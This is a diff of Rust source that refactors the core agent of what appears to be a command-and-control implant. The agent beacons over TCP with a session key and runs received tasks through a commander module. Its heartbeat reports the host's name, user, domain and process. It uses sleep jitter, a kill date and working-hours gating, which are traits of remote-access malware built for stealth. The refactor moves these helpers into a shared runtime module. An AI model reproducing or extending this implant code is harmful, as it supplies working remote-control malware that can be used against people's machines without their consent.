@@ -1,12 +1,12 @@
 use std::env;
-use std::thread;
-use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
 use crate::commander;
+use crate::async_queue;
 use crate::connector_tcp::ConnectorTCP;
 use crate::downloader::Downloader;
 use crate::jobs::JobsController;
-use crate::protocol::{self, ReaderLE, WriterBE};
+use crate::protocol::{ReaderLE, WriterBE};
+use crate::runtime_common;
 
 #[derive(Clone, Debug)]
 pub struct EmbeddedProfile {
@@ -138,7 +138,9 @@ impl Agent {
                     Err(_) => break,
                 };
 
-                let response = commander::process_tasks(self, &task_blob).unwrap_or_default();
+                let response = async_queue::merge_binary_response_blob(
+                    commander::process_tasks(self, &task_blob).unwrap_or_default(),
+                );
                 if self.connector.send_frame(&response, &self.session_key).is_err() {
                     break;
                 }
@@ -153,23 +155,18 @@ impl Agent {
     }
 
     fn build_beat(&self) -> Vec<u8> {
-        let hostname = env::var("COMPUTERNAME")
-            .or_else(|_| env::var("HOSTNAME"))
-            .unwrap_or_default();
+        let hostname = runtime_common::hostname();
         let username = env::var("USER")
             .or_else(|_| env::var("USERNAME"))
             .unwrap_or_default();
         let domain = env::var("USERDOMAIN").unwrap_or_default();
-        let process = env::current_exe()
-            .ok()
-            .and_then(|p| p.file_name().map(|f| f.to_string_lossy().to_string()))
-            .unwrap_or_else(|| "__NAME__".to_string());
+        let process = runtime_common::process_name("__NAME__");
 
         let mut w = WriterBE::new();
         w.write_u32((self.sleep_ms / 1000) as u32);
         w.write_u32(self.jitter);
         w.write_u32(self.kill_date.max(0) as u32);
-        w.write_u32(encode_working_time(self.work_start, self.work_end));
+        w.write_u32(runtime_common::encode_working_time(self.work_start, self.work_end));
         w.write_u16(0);
         w.write_u16(0);
         w.write_u8(0);
@@ -193,81 +190,24 @@ impl Agent {
         w.into_bytes()
     }
 
+    #[allow(dead_code)]
     pub fn dispatch(&mut self, cmd_code: u32, _cmd_id: u32, data: &[u8]) -> Option<Vec<u8>> {
         commander::dispatch(self, cmd_code, 0, data)
     }
 
     pub fn sleep_with_jitter(&self) {
-        let ms = self.sleep_ms as i64;
-        let actual = if self.jitter > 0 && self.jitter <= 90 {
-            let j = self.jitter as i64;
-            let seed = SystemTime::now()
-                .duration_since(UNIX_EPOCH)
-                .unwrap_or_default()
-                .subsec_nanos() as i64;
-            let pct = (seed % (j * 2 + 1)) - j;
-            let adj = ms * pct / 100;
-            let total = ms + adj;
-            if total < 500 { 500u64 } else { total as u64 }
-        } else {
-            ms.max(500) as u64
-        };
-        thread::sleep(Duration::from_millis(actual));
+        runtime_common::sleep_with_jitter(self.sleep_ms, self.jitter, 500);
     }
 
     pub fn should_exit(&self) -> bool {
-        if self.kill_date <= 0 {
-            return false;
-        }
-        let now = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_secs() as i64;
-        now >= self.kill_date
+        runtime_common::should_exit(self.kill_date)
     }
 
     pub fn wait_for_working_hours(&self) {
-        if self.work_start == 0 && self.work_end == 0 {
-            return;
-        }
-        loop {
-            let now = SystemTime::now()
-                .duration_since(UNIX_EPOCH)
-                .unwrap_or_default()
-                .as_secs();
-            let day_secs = (now % 86400) as i32;
-            let hhmm = (day_secs / 3600) * 100 + (day_secs % 3600) / 60;
-            let in_window = if self.work_start <= self.work_end {
-                hhmm >= self.work_start && hhmm < self.work_end
-            } else {
-                hhmm >= self.work_start || hhmm < self.work_end
-            };
-            if in_window {
-                break;
-            }
-            thread::sleep(Duration::from_secs(60));
-        }
+        runtime_common::wait_for_working_hours(self.work_start, self.work_end)
     }
 
     fn random_u32() -> u32 {
-        let nanos = SystemTime::now()
-            .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_nanos();
-        (nanos as u64 ^ ((nanos >> 32) as u64)) as u32
+        runtime_common::random_u32()
     }
-}
-
-fn encode_working_time(start: i32, end: i32) -> u32 {
-    if start == 0 && end == 0 {
-        return 0;
-    }
-    let start_hour = start / 100;
-    let start_min = start % 100;
-    let end_hour = end / 100;
-    let end_min = end % 100;
-    ((start_hour as u32) << 24)
-        | ((start_min as u32) << 16)
-        | ((end_hour as u32) << 8)
-        | (end_min as u32)
 }
